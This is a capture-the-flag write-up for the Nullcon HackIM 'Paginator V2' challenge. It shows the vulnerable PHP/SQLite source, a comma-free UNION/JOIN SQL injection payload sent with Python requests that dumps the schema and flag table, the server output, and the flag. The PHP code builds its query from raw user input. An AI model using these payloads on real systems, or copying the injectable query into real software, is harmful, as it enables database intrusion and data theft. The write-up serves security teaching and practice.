# Nullcon HackIM CTF - Paginator V2

```php
<?php
ini_set("error_reporting", 1);
ini_set("display_errors",1);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php"; // Now the juicy part is hidden away! $db = new SQLite3('/tmp/db.db');

try{
  $db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
} catch(Exception $e) {
  //var_dump($e);
}


if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
  [$min, $max] = explode(",",$_GET['p']);
  if(intval($min) <= 1 ) {
    die("This post is not accessible...");
  }
  try {
    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
    $result = $db->query($q);
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
      echo $row['title'] . " (ID=". $row['id'] . ") has content: \"" . $row['content'] . "\"<br>";
    }
  }catch(Exception $e) {
    echo "Try harder!";
  }
} else {
    echo "Try harder!";
}
?>

<html>
    <head>
        <title>Paginator v2</title>
    </head>
    <body>
        <h1>Paginator v2</h1>
        <a href="/?p=2,10">Show me pages 2-10</a>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>
```

## Approach

The SQL injection method is the same as the Paginator challenge. However, note that the following statement will only take the first two values separated by a comma:

```php
[$min, $max] = explode(",",$_GET['p']);
```

So we need to use `join` in the following exploits.

This is a SQLite3 database, so firstly we leak the table name by:

```python
import requests
url = "http://52.59.124.14:5015/?p=2,10 "
payload = "union select * from (select 1)A join (select 2)B join (select sql from sqlite_master)C"
resp = requests.get(url + payload)
print(resp.text)
```

The response is:

```
2 (ID=1) has content: ""
2 (ID=1) has content: "CREATE TABLE flag (id INTEGER PRIMARY KEY, name TEXT UNIQUE, value TEXT)"
2 (ID=1) has content: "CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)"
Page 2 (ID=2) has content: "This is not a flag, but just a boring page."
Page 3 (ID=3) has content: "This is not a flag, but just a boring page."
...
```

And then we can get the flag by changing the payload to:

```python
payload = "union select * from (select 1)A join (select 2)B join (select value from flag)C"
```

The response is:

```
2 (ID=1) has content: "RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvd19BZ0Exbl9BbmRfQWc0MW4hfQ=="
Page 2 (ID=2) has content: "This is not a flag, but just a boring page."
Page 3 (ID=3) has content: "This is not a flag, but just a boring page."
...
```

## Flag

```
ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow_AgA1n_And_Ag41n!}
```
